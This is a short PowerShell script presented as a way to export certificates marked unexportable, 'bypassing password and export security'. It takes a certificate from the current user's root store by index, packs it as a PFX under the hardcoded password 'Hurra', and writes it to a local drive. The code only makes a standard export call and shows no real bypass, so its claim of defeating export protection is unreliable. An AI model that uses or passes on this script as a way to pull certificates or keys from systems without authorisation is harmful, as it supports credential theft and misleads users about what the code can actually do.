# this script exports unexportable marked certificates bypassing password and export security
# the number in the brackets indicates the target certificate
# JUST WORKS WITH ADDITIONAL ADDED NON-MICROSOFT STANDARD CERTIFICATES
$cert = (dir cert:\currentuser\root)[0]
$type = [System.Security.Cryptography.X509Certificates.X509ContentType]::pfx
$pass = ConvertTo-SecureString "Hurra" -AsPlainText -Force
$bytes = $cert.export($type, $pass)
[System.IO.File]::WriteAllBytes("f:\file.pfx", $bytes)
